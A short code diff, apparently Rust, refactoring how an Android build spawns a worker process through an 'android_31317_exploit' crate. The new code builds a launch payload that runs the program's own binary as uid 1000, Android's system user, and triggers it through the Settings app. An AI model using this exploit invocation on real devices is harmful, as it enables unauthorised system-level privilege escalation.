@@ -119,13 +119,15 @@ impl WorkerProcess {
     /// Spawn a remote process to act as the system worker
     #[cfg(target_os = "android")]
     async fn spawn() -> Result<()> {
-        use android_31317_exploit::{ExploitKind, TriggerApp, build_and_execute};
+        use android_31317_exploit::{Cve31317Exploit, ExploitKind, TriggerApp};
         use std::env;
 
         let executable = env::current_exe()?;
         let executable = executable.display();
 
-        build_and_execute(
+        let exploit = Cve31317Exploit::new();
+
+        let payload = exploit.new_launch_payload(
             1000,
             None,
             None,
@@ -135,15 +137,19 @@ impl WorkerProcess {
             &ExploitKind::Command(format!(
                 "{executable} internal-wrapper --is-zygote \"{executable} worker\""
             )),
-            &TriggerApp::new(
-                "com.android.settings".into(),
-                "com.android.settings.Settings".into(),
-            ),
             None,
-            true,
-            true,
-        )
-        .await?;
+        )?;
+
+        payload
+            .execute(
+                &TriggerApp::new(
+                    "com.android.settings".into(),
+                    "com.android.settings.Settings".into(),
+                ),
+                true,
+                true,
+            )
+            .await?;
 
         Ok(())
     }
